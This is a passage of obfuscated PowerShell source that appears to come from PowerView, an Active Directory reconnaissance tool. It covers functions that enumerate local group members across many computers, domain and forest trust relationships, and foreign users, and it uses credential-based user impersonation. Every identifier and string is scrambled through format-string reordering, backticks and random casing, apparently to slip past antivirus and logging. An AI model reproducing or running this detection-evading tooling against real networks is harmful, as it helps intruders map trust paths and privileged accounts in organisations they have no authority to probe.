                        ("{1}{0}"-f'd','Metho') = ${MEth`Od}
                        ("{1}{2}{0}" -f'oupName','G','r') = ${grouP`NA`Me}
                    }
                    &("{0}{6}{3}{2}{5}{1}{4}"-f 'Get-N','mbe','al','oc','r','GroupMe','etL') @NetLocalGroupMemberArguments
                }
            }

            if (${tOkEN`h`AN`DLE}) {
                &("{3}{5}{4}{1}{0}{2}" -f'ToSe','t','lf','Invo','ver','ke-Re')
            }
        }

        ${LOgOnTO`K`En} = ${nU`lL}
        if (${p`SbOuNDP`Ar`AM`eTerS}[("{2}{3}{1}{0}"-f'l','ntia','Cr','ede')]) {
            if (${pSBouNdP`A`RA`meTe`Rs}[("{0}{1}"-f'Del','ay')] -or ${PSboUn`Dpa`R`Amete`RS}[("{3}{0}{1}{2}" -f 'pOnSucce','s','s','Sto')]) {
                ${log`o`Nt`oKEn} = &("{0}{4}{2}{1}{3}"-f 'Invoke-U','sona','per','tion','serIm') -Credential ${c`Rede`NTiAL}
            }
            else {
                ${LOgON`T`o`KEN} = &("{1}{3}{5}{2}{0}{4}" -f'o','Invoke','ersonati','-Use','n','rImp') -Credential ${C`ReD`entiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pSbOUNd`pAR`Amet`E`RS}[("{1}{0}"-f'elay','D')] -or ${ps`BOu`NdpaRaMeTe`RS}[("{4}{3}{2}{0}{1}" -f 'es','s','Succ','pOn','Sto')]) {

            &("{2}{0}{1}{4}{3}" -f'i','te-','Wr','ose','Verb') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{2}{1}{0}{3}" -f'erbo','e-V','Writ','se') ('['+'Fin'+'d-DomainLocalGroupM'+'em'+'b'+'er] '+'De'+'lay:'+' '+"$Delay, "+'Jitter'+': '+"$Jitter")
            ${Co`UNT`eR} = 0
            ${R`And`No} = &("{0}{2}{1}"-f 'Ne','-Object','w') ("{1}{2}{3}{0}"-f'dom','Syste','m','.Ran')

            ForEach (${Ta`RGEt`ComPut`er} in ${tARgEtC`Om`pUt`Ers}) {
                ${CO`U`NTEr} = ${CO`Un`TEr} + 1

                
                &("{0}{2}{1}" -f'St','Sleep','art-') -Seconds ${RaN`DNo}.("{0}{1}" -f 'Nex','t').Invoke((1-${JITT`ER})*${DEL`AY}, (1+${jITT`Er})*${DE`l`AY})

                &("{3}{0}{1}{2}"-f'V','erbo','se','Write-') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{2}{3}{0}{1}"-f'mm','and','Invoke-','Co') -ScriptBlock ${HoS`T`enuMBlo`cK} -ArgumentList ${T`AR`getc`omp`UTer}, ${g`RoUpn`AMe}, ${METh`oD}, ${lOG`o`Nt`OkEn}
            }
        }
        else {
            &("{1}{2}{0}" -f 'Verbose','Wr','ite-') ('[F'+'i'+'nd-DomainLo'+'cal'+'G'+'roupMemb'+'er] '+'Us'+'ing '+'threadin'+'g'+' '+'wit'+'h '+'threa'+'ds'+': '+"$Threads")

            
            ${s`C`Rip`Tpa`RAMs} = @{
                ("{2}{0}{1}"-f 'rou','pName','G') = ${grou`PnA`ME}
                ("{1}{0}" -f 'od','Meth') = ${Met`h`oD}
                ("{0}{2}{1}"-f'To','nHandle','ke') = ${lOGOnt`O`kEn}
            }

            
            &("{1}{2}{3}{0}"-f'n','New-Thr','eadedFun','ctio') -ComputerName ${t`AR`GetCom`puTE`RS} -ScriptBlock ${hOSte`N`UmB`L`oCk} -ScriptParameters ${s`c`RIP`TPA`RAMs} -Threads ${t`hRe`AdS}
        }
    }

    END {
        if (${LoGON`To`KEn}) {
            &("{4}{1}{3}{2}{0}" -f'elf','oke-RevertT','S','o','Inv') -TokenHandle ${lOG`oN`ToK`en}
        }
    }
}








function GeT-dO`M`AI`NTr`UST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{4}{0}" -f'ss','ouldProc','PS','Sh','e'}, '')]
    [OutputType({"{7}{0}{2}{5}{6}{3}{4}{1}"-f'rView.','ust.NET','Do','nT','r','ma','i','Powe'})]
    [OutputType({"{4}{0}{1}{3}{2}" -f 'werVi','ew.Dom','ust.LDAP','ainTr','Po'})]
    [OutputType({"{3}{2}{4}{1}{0}"-f 'ust.API','mainTr','.','PowerView','Do'})]
    [CmdletBinding(DefaultPaRamEterSeTNAMe = {"{1}{0}"-f'AP','LD'})]
    Param(
        [Parameter(pOSITIOn = 0, vaLUeFroMPipElIne = ${T`RUE}, VaLuEFrompIpeLineBYPrOPERTYnAME = ${t`Rue})]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMA`iN},

        [Parameter(ParaMeterSEtNAmE = 'API')]
        [Switch]
        ${a`pI},

        [Parameter(PARAmeTeRSETnamE = 'NET')]
        [Switch]
        ${n`ET},

        [Parameter(paraMEtersEtname = "L`DaP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filte','r'})]
        [String]
        ${L`DaP`FI`lTER},

        [Parameter(parAMETeRSetNAMe = "L`dAp")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRO`Pe`R`TIES},

        [Parameter(PARAMETERSEtnAmE = "Ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'h','at','ADSP'})]
        [String]
        ${SEAR`ch`Ba`sE},

        [Parameter(pARametERsetNAmE = "Ld`Ap")]
        [Parameter(PAraMetERSETNaME = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'oller','Contr','Domain'})]
        [String]
        ${s`erV`eR},

        [Parameter(pAramEtersEtnAme = "L`dAP")]
        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{0}{1}" -f'OneLe','vel'}, {"{0}{1}{2}" -f'Subt','re','e'})]
        [String]
        ${SeArCh`s`cope} = ("{1}{0}"-f'tree','Sub'),

        [Parameter(PAramETeRSetnaMe = "Ld`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${rE`S`U`LTPAG`esIze} = 200,

        [Parameter(ParametErSetNAme = "Ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${sERv`ERT`IME`LiMIT},

        [Parameter(PARamETerSEtnaME = "LD`AP")]
        [Switch]
        ${ToMBS`T`O`Ne},

        [Alias({"{0}{1}{2}"-f 'R','et','urnOne'})]
        [Switch]
        ${fInD`o`NE},

        [Parameter(PaRAmEtErSeTnamE = "lD`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREd`EN`TiAl} =   (variAbLE  0Dsqr  -va  )::"EMP`Ty"
    )

    BEGIN {
        ${tr`UST`At`TRiB`UTEs} = @{
            [uint32]("{2}{0}{1}"-f'000000','1','0x0') = ("{0}{2}{1}{3}" -f'N','TRANSIT','ON_','IVE')
            [uint32]("{1}{2}{0}"-f'2','0x000000','0') = ("{1}{3}{2}{0}"-f'LY','UPLEV','_ON','EL')
            [uint32]("{1}{2}{0}" -f'00004','0','x000') = ("{2}{3}{0}{1}" -f '_','SIDS','FI','LTER')
            [uint32]("{0}{1}{2}"-f '0x000','0000','8') = ("{0}{3}{2}{5}{1}{4}" -f 'FOR','TIV','S','EST_TRAN','E','I')
            [uint32]("{2}{0}{1}"-f 'x0000','0010','0') = ("{2}{3}{1}{0}"-f'N','O','CROSS_ORGANI','ZATI')
            [uint32]("{1}{2}{0}" -f '0020','0x000','0') = ("{2}{0}{1}{3}" -f'HIN_','FO','WIT','REST')
            [uint32]("{1}{2}{0}"-f'40','0x0','00000') = ("{3}{0}{1}{2}" -f'REAT_','A','S_EXTERNAL','T')
            [uint32]("{2}{0}{1}" -f '0','0080','0x000') = ("{1}{5}{2}{4}{3}{6}{0}"-f'N','TRUST_USE','_RC4_','RYP','ENC','S','TIO')
            [uint32]("{0}{1}{2}" -f '0x0','00001','00') = ("{3}{4}{1}{0}{5}{2}" -f'AE','_USES_','YS','TR','UST','S_KE')
            [uint32]("{0}{2}{3}{1}" -f '0','200','x','00000') = ("{7}{2}{1}{5}{6}{4}{3}{9}{8}{0}" -f'ION','S','S','ON_N','ANIZATI','_O','RG','CRO','AT','O_TGT_DELEG')
            [uint32]("{0}{1}{2}"-f '0x00','000','400') = ("{2}{0}{1}"-f 'TRU','ST','PIM_')
        }

        ${LdaP`SeA`RCH`ErARg`Um`En`TS} = @{}
        if (${p`s`BO`UnDpaRAm`ETERs}[("{0}{1}" -f 'Domai','n')]) { ${lDApSeAR`cHE`RarG`U`MenTS}[("{0}{1}{2}" -f 'Do','mai','n')] = ${d`omain} }
        if (${PS`BouNdP`AR`AMEtErs}[("{1}{2}{0}" -f'lter','LDAPF','i')]) { ${lD`ApSE`ARChERaRGum`en`TS}[("{1}{2}{0}"-f 'er','LDAPFi','lt')] = ${LD`Ap`FILter} }
        if (${psBoUNd`pAR`AMe`TE`RS}[("{1}{2}{0}"-f 'perties','Pr','o')]) { ${L`dAPS`EA`Rc`HeRa`R`GUmeNtS}[("{2}{1}{0}"-f'operties','r','P')] = ${Pr`oP`eRtI`Es} }
        if (${psbo`UN`DPaRA`ME`TeRs}[("{0}{2}{1}"-f'Sea','e','rchBas')]) { ${l`DaPSearChERaRgu`M`E`Nts}[("{0}{2}{1}{3}"-f 'Se','B','arch','ase')] = ${SEar`Ch`Ba`Se} }
        if (${ps`B`ouNdPA`R`AmE`TErS}[("{0}{1}" -f'Se','rver')]) { ${LDaPsEArChe`R`ArG`UM`eNtS}[("{2}{1}{0}"-f'r','ve','Ser')] = ${sER`VER} }
        if (${pSBO`U`NDp`Ar`AmetERS}[("{1}{2}{0}" -f 'cope','Se','archS')]) { ${l`da`psEar`CHErArG`UmeNTS}[("{2}{1}{0}{3}"-f'o','archSc','Se','pe')] = ${Se`AR`CHSC`oPe} }
        if (${PsboUNdpA`Ram`ETe`RS}[("{1}{2}{0}"-f'PageSize','Re','sult')]) { ${lD`ApsearC`HeraRg`UMeN`TS}[("{0}{4}{2}{1}{3}"-f'Resu','z','Si','e','ltPage')] = ${RESulT`page`sIZe} }
        if (${p`SBound`P`Ar`AMEte`Rs}[("{0}{4}{2}{3}{1}" -f'Se','eLimit','r','Tim','rve')]) { ${ldaP`s`e`A`RCH`ER`ARGuMEnTS}[("{2}{1}{0}{3}"-f'mi','rTimeLi','Serve','t')] = ${s`Er`V`eRTI`Me`lImIt} }
        if (${P`sBOuN`dpA`RAMEtErS}[("{2}{1}{0}"-f 'e','ston','Tomb')]) { ${lDa`p`s`EarC`HERa`RguMen`Ts}[("{0}{2}{1}"-f'Tombs','e','ton')] = ${T`oMB`STONe} }
        if (${Ps`BOuNdp`AR`AMeters}[("{0}{3}{2}{1}" -f 'Cr','ntial','de','e')]) { ${lD`A`pseaRc`h`erar`guMENTS}[("{1}{2}{0}" -f'ntial','Cr','ede')] = ${c`REde`NtIAl} }
    }

    PROCESS {
        if (${p`sCMd`leT}.PArameTerSETNaME -ne 'API') {
            ${nEtseaRchERaR`g`Um`EN`Ts} = @{}
            if (${d`omAin} -and ${d`o`mAiN}.("{0}{1}"-f'T','rim').Invoke() -ne '') {
                ${s`ouRceDo`m`AiN} = ${d`OM`AIn}
            }
            else {
                if (${P`sBo`UNDp`AR`A`MetERS}[("{1}{0}{2}" -f 'nti','Crede','al')]) {
                    ${sOUR`ce`do`m`AIN} = (&("{2}{0}{1}" -f 'm','ain','Get-Do') -Credential ${crE`DE`NT`iAl})."n`AMe"
                }
                else {
                    ${s`oU`RcedoM`AIN} = (&("{1}{0}{2}"-f't-','Ge','Domain'))."N`AMe"
                }
            }
        }
        elseif (${P`ScMd`LeT}.paRaMETerSETname -ne 'NET') {
            if (${d`o`maIN} -and ${dOm`AIN}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') {
                ${s`our`C`edOMain} = ${do`m`AIn}
            }
            else {
                ${SOU`R`c`E`DoMAIn} = ${eN`V:US`Erdn`s`DoMain}
            }
        }

        if (${P`SCM`Dl`Et}.pARamETeRSETNaME -eq ("{1}{0}"-f 'DAP','L')) {
            
            ${truS`TS`EarCh`ER} = &("{3}{2}{4}{1}{0}" -f 'er','nSearch','t-Dom','Ge','ai') @LdapSearcherArguments
            ${so`U`RcEs`ID} = &("{2}{0}{3}{1}" -f '-','omainSID','Get','D') @NetSearcherArguments

            if (${trUsT`sea`RCH`Er}) {

                ${T`RuStSeArC`h`ER}."F`Ilter" = (("{4}{6}{0}{3}{1}{5}{2}"-f'tClas','=trustedD','n)','s','(o','omai','bjec'))

                if (${psBouNDP`Ara`ME`T`erS}[("{1}{0}"-f'indOne','F')]) { ${re`S`UltS} = ${T`RUstSEAR`C`Her}.("{1}{0}" -f'One','Find').Invoke() }
                else { ${r`E`SuLTS} = ${T`Rus`T`SeA`RcHer}.("{1}{0}" -f'dAll','Fin').Invoke() }
                ${R`ESUl`Ts} | &("{1}{2}{0}{3}" -f 'e-','Wh','er','Object') {${_}} | &("{0}{1}{3}{2}"-f'ForEa','ch','ct','-Obje') {
                    ${Pr`opS} = ${_}."p`RopER`TIEs"
                    ${Do`m`AiNtRu`sT} = &("{3}{2}{1}{0}"-f 't','bjec','ew-O','N') ("{1}{2}{0}"-f'ject','P','SOb')

                    ${T`R`UsTaT`TRiB} = @()
                    ${T`Ru`St`AtTRib} += ${t`RuStAt`T`R`ibuTeS}."K`eYs" | &("{1}{0}{2}"-f'her','W','e-Object') { ${P`RoPS}."tRU`stATT`RI`B`UteS"[0] -band ${_} } | &("{0}{1}{3}{2}{4}"-f'For','Each-','e','Obj','ct') { ${trUs`T`AT`TribU`TeS}[${_}] }

                    ${d`iR`ecT`Ion} = Switch (${p`Rops}."trU`stD`ireCT`i`ON") {
                        0 { ("{0}{1}{2}"-f 'Di','sa','bled') }
                        1 { ("{2}{0}{1}"-f'o','und','Inb') }
                        2 { ("{2}{0}{1}"-f'u','nd','Outbo') }
                        3 { ("{1}{2}{3}{0}" -f'ional','Bi','di','rect') }
                    }

                    ${TrUStT`y`pE} = Switch (${p`RoPS}."TruSt`T`YPE") {
                        1 { ("{2}{5}{3}{4}{0}{6}{1}"-f'CTIVE_DIR','CTORY','WIN','S_N','ON_A','DOW','E') }
                        2 { ("{1}{2}{0}{3}{4}" -f 'S_ACTIVE_DIREC','WI','NDOW','TOR','Y') }
                        3 { 'MIT' }
                    }

                    ${d`isTIN`GuISh`edna`ME} = ${pR`opS}."DI`st`iNGUIS`hednAme"[0]
                    ${soU`Rce`Name`in`dex} = ${D`iST`iNguiShedNa`Me}.("{1}{0}"-f'ndexOf','I').Invoke('DC=')
                    if (${s`o`U`RC`eNameiNdEx}) {
                        ${SoUR`ceD`O`mAIn} = $(${DI`st`inGuIShe`D`NAmE}.("{1}{0}" -f'String','Sub').Invoke(${SOuRCEnAmeI`N`D`EX})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${SOu`Rc`eDOM`A`in} = ""
                    }

                    ${tA`R`g`EtnAmEindEX} = ${Dis`TING`U`ishEDn`A`ME}.("{0}{1}" -f'I','ndexOf').Invoke(("{1}{2}{0}" -f 'tem',',CN=Sy','s'))
                    if (${so`U`RCeNamEInD`Ex}) {
                        ${T`Ar`GetDomAIn} = ${DiStinG`U`I`SHEdN`AmE}.("{1}{0}{2}" -f 'i','SubStr','ng').Invoke(3, ${taRGE`T`Na`MeiND`Ex}-3)
                    }
                    else {
                        ${t`Arg`ET`DomA`IN} = ""
                    }

                    ${oB`JEcT`GU`Id} = &("{2}{1}{0}{3}"-f 'j','ew-Ob','N','ect') ("{1}{0}"-f'd','Gui') @(,${PR`Ops}."o`BJEctGu`iD"[0])
                    ${T`ARGe`TSId} = (&("{0}{1}{2}"-f'New','-Obje','ct') ("{4}{0}{7}{3}{1}{8}{2}{6}{5}{9}" -f 'curity.','p','l.S','inci','System.Se','curityId','e','Pr','a','entifier')(${pR`o`Ps}."s`E`CuRI`Tyid`ENTif`ieR"[0],0))."Va`Lue"

                    ${do`M`AINTru`st} | &("{1}{0}{2}{3}"-f'd','A','d-Mem','ber') ("{0}{2}{3}{1}"-f 'Notep','y','roper','t') ("{0}{3}{2}{1}"-f'So','ame','rceN','u') ${SOu`Rcedo`M`AIn}
                    ${d`om`AInT`RUst} | &("{0}{2}{1}" -f'Add-M','ber','em') ("{2}{0}{1}" -f 'eproper','ty','Not') ("{1}{0}{2}" -f'tNa','Targe','me') ${p`ROps}."Na`Me"[0]
                    
                    ${D`o`ma`iNTrUst} | &("{1}{0}{2}"-f '-Membe','Add','r') ("{0}{2}{1}{3}"-f 'No','er','teprop','ty') ("{1}{2}{0}"-f'e','Tr','ustTyp') ${t`RU`sttyPE}
                    ${do`maintrU`ST} | &("{1}{0}{2}" -f 'd-Mem','Ad','ber') ("{2}{0}{1}" -f 'pe','rty','Notepro') ("{3}{2}{0}{1}" -f'tribu','tes','t','TrustA') $(${TRUsT`A`TTr`Ib} -join ',')
                    ${D`oMaI`NTRUSt} | &("{2}{1}{0}" -f'er','-Memb','Add') ("{2}{0}{1}" -f 'teprop','erty','No') ("{1}{2}{0}" -f'Direction','T','rust') "$Direction"
                    ${D`O`MaiN`TrUsT} | &("{2}{0}{1}" -f'd-Membe','r','Ad') ("{3}{2}{1}{0}" -f'ty','proper','e','Not') ("{0}{2}{1}{3}" -f'Wh','eate','enCr','d') ${PRO`Ps}."wHE`N`CR`EATed"[0]
                    ${domaI`N`TrU`ST} | &("{3}{2}{0}{1}"-f'be','r','m','Add-Me') ("{2}{0}{1}"-f'oteprope','rty','N') ("{1}{0}{3}{2}" -f'h','WhenC','ged','an') ${PRo`Ps}."WHeN`cH`AnGed"[0]
                    ${d`OmA`in`TrUST}."pS`obJe`Ct"."TypE`NA`Mes".("{1}{2}{0}" -f'ert','I','ns').Invoke(0, ("{2}{5}{0}{7}{6}{4}{1}{3}" -f 'iew','LD','P','AP','Trust.','owerV','in','.Doma'))
                    ${DO`MAi`NT`RusT}
                }
                if (${rEs`UL`Ts}) {
                    try { ${REsU`L`TS}.("{1}{0}{2}"-f'spo','di','se').Invoke() }
                    catch {
                        &("{2}{0}{1}"-f 'e','-Verbose','Writ') ('[Get-'+'Domai'+'nTrust'+'] '+'Error'+' '+'di'+'spos'+'ing '+'of'+' '+'th'+'e '+'Re'+'s'+'ults '+'obj'+'ect: '+"$_")
                    }
                }
                ${T`Rus`TSe`ARcHEr}.("{1}{2}{0}"-f 'e','dispo','s').Invoke()
            }
        }
        elseif (${PScM`D`Let}.paRaMETErSETnAmE -eq 'API') {
            
            if (${ps`BOuN`DpaRAM`ete`Rs}[("{1}{0}"-f'er','Serv')]) {
                ${T`ARGET`DC} = ${s`e`RvER}
            }
            elseif (${DOM`AIN} -and ${dOm`A`iN}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') {
                ${Ta`RgE`TDC} = ${DoMa`iN}
            }
            else {
                
                ${t`AR`getDC} = ${N`ULl}
            }

            
            ${p`Tri`NfO} =   (  GET-iTEM  ('VAR'+'i'+'able'+':1V4'+'r') ).vALuE::"ze`Ro"

            
            ${F`laGs} = 63
            ${D`om`AIncOunT} = 0

            
            ${r`eS`UlT} = ${net`ApI`32}::"dSe`NumERat`Ed`om`A`iN`TRUsTS"(${T`Arge`TDc}, ${FL`Ags}, [ref]${Pt`Ri`NFO}, [ref]${DOM`AiNC`o`Unt})

            
            ${oF`Fs`et} = ${PT`RInfO}.("{0}{1}{2}" -f'T','oInt6','4').Invoke()

            
            if ((${re`sU`lt} -eq 0) -and (${OfF`SET} -gt 0)) {

                
                ${INcRE`m`e`NT} = ${ds`_d`oM`AiN_tRUSTS}::("{1}{0}{2}" -f'S','Get','ize').Invoke()

                
                for (${i} = 0; (${i} -lt ${DO`m`A`IncOUNt}); ${i}++) {
                    
                    ${nE`w`InTPTr} = &("{2}{1}{0}" -f 'Object','ew-','N') ("{0}{2}{1}{4}{3}" -f 'S','t','ystem.In','tr','p') -ArgumentList ${OFfs`Et}
                    ${I`Nfo} = ${NE`wiN`TPTR} -as ${dS_DOm`A`iN_TRu`STS}

                    ${o`FfsEt} = ${nE`W`INtpTr}.("{1}{2}{0}" -f '4','To','Int6').Invoke()
                    ${OfF`S`Et} += ${IN`CReM`ENt}

                    ${s`iD`sTring} = ''
                    ${R`e`SuLT} = ${aDVaP`i32}::"cONV`ertsI`dTos`T`R`inGsId"(${iN`Fo}."dom`Ainsid", [ref]${SI`dstRi`Ng});${Laste`R`RoR} =  ( VARiaBLe ('9'+'1Yp') -VA)::("{3}{4}{5}{2}{0}{1}" -f 'rr','or','E','Ge','tLastWin3','2').Invoke()

                    if (${RE`Su`LT} -eq 0) {
                        &("{2}{1}{0}" -f'erbose','e-V','Writ') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${dom`AiNtr`U`St} = &("{1}{0}{2}"-f'-','New','Object') ("{2}{0}{1}"-f'Objec','t','PS')
                        ${DOmaI`N`TR`UsT} | &("{2}{1}{0}" -f'd-Member','d','A') ("{1}{0}{2}"-f'otep','N','roperty') ("{0}{3}{2}{1}" -f'Source','e','m','Na') ${sour`ceDO`MaiN}
                        ${Do`mAinTR`UsT} | &("{2}{0}{1}{3}" -f 'd','d-Memb','A','er') ("{0}{3}{1}{2}"-f 'N','rt','y','oteprope') ("{2}{1}{0}" -f'ame','getN','Tar') ${IN`Fo}."dnS`DOm`AiN`N`AMe"
                        ${dO`MA`IntRu`st} | &("{0}{1}{2}"-f'A','dd-Membe','r') ("{2}{1}{0}"-f 'erty','prop','Note') ("{1}{3}{2}{0}" -f'e','Targ','NetbiosNam','et') ${i`Nfo}."NeTbiOsd`oma`iN`NAMe"
                        ${dOmAIN`T`RuSt} | &("{0}{1}{2}" -f'A','dd','-Member') ("{0}{2}{1}{3}"-f 'Notepr','pe','o','rty') ("{0}{1}" -f'Fla','gs') ${IN`FO}."Fl`AGs"
                        ${dOM`AiN`TRUsT} | &("{1}{2}{0}" -f 'ember','Ad','d-M') ("{1}{3}{2}{0}" -f 'y','Note','ert','prop') ("{2}{0}{1}"-f 'aren','tIndex','P') ${in`Fo}."P`ArenTi`NDEx"
                        ${Do`MaI`NT`RUst} | &("{1}{2}{0}" -f'er','Add-M','emb') ("{2}{1}{0}{3}"-f 'pe','pro','Note','rty') ("{1}{0}{2}" -f 'ru','T','stType') ${i`NFo}."t`RuStT`Y`pE"
                        ${dO`MA`INtr`UsT} | &("{0}{1}{2}"-f'Add','-','Member') ("{2}{0}{3}{1}"-f'tepr','rty','No','ope') ("{1}{3}{2}{0}" -f'tes','Tr','u','ustAttrib') ${i`NfO}."T`RuSTAttRiB`U`Tes"
                        ${do`Main`TRuSt} | &("{1}{0}{2}{3}" -f'-','Add','Mem','ber') ("{0}{2}{1}{3}"-f 'Note','ope','pr','rty') ("{0}{1}{2}"-f 'Tar','ge','tSid') ${sI`DstR`i`NG}
                        ${dOM`A`Intrust} | &("{2}{1}{0}" -f 'mber','e','Add-M') ("{2}{1}{0}"-f'operty','r','Notep') ("{0}{2}{3}{1}" -f'T','d','ar','getGui') ${I`NfO}."doM`A`IngUid"
                        ${d`OmAIn`TRUsT}."psOBJ`E`Ct"."TYpeNa`m`eS".("{0}{1}"-f 'Inser','t').Invoke(0, ("{2}{1}{4}{3}{0}" -f'API','w.Domain','PowerVie','rust.','T'))
                        ${D`oMA`IN`TRUst}
                    }
                }
                
                ${Nu`Ll} = ${NeTA`Pi`32}::("{0}{2}{1}"-f 'Ne','fferFree','tApiBu').Invoke(${P`TR`iNfo})
            }
            else {
                &("{1}{0}{2}" -f'ite-','Wr','Verbose') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${foU`N`dDoMAiN} = &("{3}{0}{1}{2}" -f't-D','o','main','Ge') @NetSearcherArguments
            if (${FO`UndDOM`Ain}) {
                ${FoUND`D`OM`AiN}.("{3}{2}{5}{4}{0}{1}" -f 'tRelationsh','ips','tAllT','Ge','s','ru').Invoke() | &("{4}{3}{0}{2}{1}" -f 'h-Obje','t','c','ac','ForE') {
                    ${_}."PSOB`JEct"."TyPE`N`AmEs".("{0}{2}{1}"-f'In','t','ser').Invoke(0, ("{5}{3}{4}{2}{1}{6}{0}"-f 'NET','ma','.Do','V','iew','Power','inTrust.'))
                    ${_}
                }
            }
        }
    }
}


function GEt`-`FOr`EstT`RUSt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f 'ul','P','dProcess','SSho'}, '')]
    [OutputType({"{1}{4}{3}{2}{0}"-f'T','PowerView','st.NE','ru','.ForestT'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTiON = 0, ValUefROMpiPELInE = ${tR`Ue}, VaLUeFROMpIPelINEbyProPeRTynAME = ${T`RUE})]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fORE`sT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`enT`IaL} =  (GEt-cHiLdITEM varIABLe:0dSQr  ).vALue::"e`MPTy"
    )

    PROCESS {
        ${nETf`ORes`TArguMe`NtS} = @{}
        if (${p`SbouNdPA`RA`meTe`RS}[("{0}{1}" -f'F','orest')]) { ${net`For`E`stArGUmen`Ts}[("{0}{1}{2}" -f 'F','or','est')] = ${F`orEst} }
        if (${p`SB`OunD`p`AramEt`erS}[("{1}{2}{0}"-f'al','Cr','edenti')]) { ${Ne`T`F`orEStargU`MENts}[("{1}{0}{2}" -f 'e','Cred','ntial')] = ${CRE`DEnTi`Al} }

        ${fOunD`For`ESt} = &("{1}{2}{0}" -f 't','Get','-Fores') @NetForestArguments

        if (${f`o`UN`dForESt}) {
            ${FOunDFo`R`eSt}.("{3}{1}{4}{2}{0}" -f 's','ll','ionship','GetA','TrustRelat').Invoke() | &("{2}{1}{4}{0}{3}" -f'-Obje','rEa','Fo','ct','ch') {
                ${_}."PS`OBJe`Ct"."tYPe`NA`MEs".("{1}{0}"-f 't','Inser').Invoke(0, ("{6}{4}{5}{1}{0}{2}{7}{3}" -f '.Fores','iew','tT','st.NET','o','werV','P','ru'))
                ${_}
            }
        }
    }
}


function Ge`T`-dOM`A`Inf`OrEIgnU`SEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}{4}" -f 'dProc','PSSh','oul','es','s'}, '')]
    [OutputType({"{4}{1}{3}{2}{0}{5}{6}"-f'gnU','ow','View.Forei','er','P','se','r'})]
    [CmdletBinding()]
    Param(
        [Parameter(positIon = 0, VAlUefrompIPeLIne = ${t`RUE}, ValueFRoMPiPEliNEByPRoPERtyNAmE = ${T`RuE})]
        [Alias({"{0}{1}"-f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 't','Fil','er'})]
        [String]
        ${LD`ApFI`ltER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROp`erti`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'th','ADSPa'})]
        [String]
        ${s`Earc`HbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}"-f'Dom','ntr','oller','ainCo'})]
        [String]
        ${sE`RVer},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{2}{0}{1}"-f'eLe','vel','On'}, {"{0}{1}" -f'Sub','tree'})]
        [String]
        ${se`ARcHsC`oPe} = ("{1}{0}" -f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUl`TPag`eS`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERvE`R`Ti`Mel`IM`It},

        [ValidateSet({"{0}{1}" -f'D','acl'}, {"{0}{1}"-f 'G','roup'}, {"{0}{1}"-f 'No','ne'}, {"{1}{0}"-f 'ner','Ow'}, {"{1}{0}" -f'cl','Sa'})]
        [String]
        ${SeCu`RiT`y`M`Asks},

        [Switch]
        ${tOMb`s`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EDenT`IAL} =  (  gi  VaRiabLe:0dsQR).vaLuE::"E`mPtY"
    )

    BEGIN {
        ${se`ARCh`Er`A`RG`UMENTs} = @{}
        ${se`ARcheR`A`R`GUMen`TS}[("{2}{0}{1}" -f 't','er','LDAPFil')] = (("{1}{3}{2}{0}"-f'f=*)','(mem','o','ber'))
        if (${P`SBOUNd`paR`AMetERs}[("{0}{1}"-f'Doma','in')]) { ${sEARChera`RG`U`Me`Nts}[("{0}{2}{1}"-f'D','main','o')] = ${Do`Ma`IN} }
        if (${psBO`Un`d`paR`AmETERS}[("{2}{1}{0}" -f 's','pertie','Pro')]) { ${se`Ar`chE`RAr`Gum`Ents}[("{1}{0}{2}"-f 'ropert','P','ies')] = ${Pr`operTi`es} }
        if (${Psbo`UnDPA`R`AMetE`RS}[("{2}{0}{1}" -f 'a','rchBase','Se')]) { ${se`AR`C`hErARgume`NTS}[("{0}{2}{1}{3}"-f 'S','a','earchB','se')] = ${Se`A`RcHb`Ase} }
        if (${psBouNd`paRame`T`ERS}[("{0}{2}{1}"-f 'Ser','er','v')]) { ${seA`R`cheRarg`UmeNTS}[("{0}{1}" -f 'Ser','ver')] = ${s`ERver} }
        if (${PSBO`UN`DpaRa`METe`Rs}[("{1}{0}{2}"-f 'arc','Se','hScope')]) { ${SEARChE`RarGUm`e`NTs}[("{1}{0}{2}{3}"-f'c','Sear','hSco','pe')] = ${sEarC`HS`coPe} }
